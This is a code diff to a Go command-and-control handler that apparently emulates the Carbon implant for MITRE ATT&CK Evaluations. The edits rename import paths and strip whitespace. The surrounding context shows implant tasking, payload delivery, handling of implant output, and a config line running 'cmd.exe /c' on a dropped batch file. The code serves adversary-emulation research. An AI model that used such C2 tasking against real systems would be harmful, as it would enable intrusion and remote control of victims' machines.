@@ -19,9 +19,9 @@ import (
 
 	"github.com/gorilla/mux"
 
-	"attackevals.mitre-engenuity.org/control_server/config"
-	"attackevals.mitre-engenuity.org/control_server/handlers/util"
-	"attackevals.mitre-engenuity.org/control_server/logger"
+	"attackevals.mitre.org/control_server/config"
+	"attackevals.mitre.org/control_server/handlers/util"
+	"attackevals.mitre.org/control_server/logger"
 )
 
 const (
@@ -253,7 +253,7 @@ func (c *CarbonHttpHandler) forwardGetFileFromServer(fileName string) ([]byte, e
 }
 
 func buildConfigData(payloadPath, command string) []byte {
-	/* 
+	/*
 	 [CONFIG]
 	 name = C:\users\public\sysh32.bat
 	 exe = cmd.exe /c C:\users\public\sysh32.bat
@@ -274,7 +274,7 @@ func (c *CarbonHttpHandler) extractTaskParts(taskString string, task *Task) (err
 	if err != nil {
 		return err
 	}
-	
+
 	// Extract task ID (required)
 	if taskIdVal, ok := instructionData["id"]; ok {
 		parsedTaskId, castOk := taskIdVal.(float64)
@@ -285,7 +285,7 @@ func (c *CarbonHttpHandler) extractTaskParts(taskString string, task *Task) (err
 	} else {
 		return errors.New("Task ID not provided in task string")
 	}
-	
+
 	// Extract routing blob (default empty)
 	if routingBlobStr, ok := instructionData["routing"]; ok {
 		task.routingBlob = []byte(strings.TrimSpace(routingBlobStr.(string)))
@@ -293,7 +293,7 @@ func (c *CarbonHttpHandler) extractTaskParts(taskString string, task *Task) (err
 		task.routingBlob = make([]byte, 0)
 	}
 	task.lenRoutingBlob = int32(len(task.routingBlob))
-	
+
 	// Extract task code (default 0)
 	if taskCodeVal, ok := instructionData["code"]; ok {
 		parsedTaskCode, castOk := taskCodeVal.(float64)
@@ -304,7 +304,7 @@ func (c *CarbonHttpHandler) extractTaskParts(taskString string, task *Task) (err
 	} else {
 		task.taskCode = int32(0)
 	}
-	
+
 	// Extract payload info
 	payloadNameStr, ok := instructionData["payload"]
 	if !ok {
@@ -330,18 +330,18 @@ func (c *CarbonHttpHandler) extractTaskParts(taskString string, task *Task) (err
 		task.payloadData = []byte{}
 	}
 	task.lenPayload = int32(len(task.payloadData))
-	
+
 	// Extract command info
 	command := ""
 	if commandStr, ok := instructionData["cmd"]; ok {
 		command = strings.TrimSpace(commandStr.(string))
 	}
-	
+
 	// Build task config
 	task.configData = buildConfigData(payloadDestPath, command)
 	task.lenConfig = int32(len(task.configData))
 
-	return nil	
+	return nil
 }
 
 /* Chunks layout:
@@ -421,7 +421,7 @@ func (c *CarbonHttpHandler) convertTaskToResponse(uuid, taskString string) (stri
 		} else {
 			logger.Info(fmt.Sprintf("Encoded task string: %s", encodedCommand))
 		}
-		
+
 		c.commandNumbers[uuid] = commandNum + 1
 	}
 	response := c.buildResponsePage(encodedCommand)
@@ -639,7 +639,7 @@ func (c *CarbonHttpHandler) processAndForwardImplantOutput(uuid string, data []b
 			logger.Error(fmt.Sprintf("Failed to process and forward task output: %s", err.Error()))
 		}
 		logger.Success(string(restResponse))
-		delete(c.pendingCommandOutput[uuid], int(c.commandNumbers[uuid]))		
+		delete(c.pendingCommandOutput[uuid], int(c.commandNumbers[uuid]))
 	}
 
 	// for now, just output the unpacked data
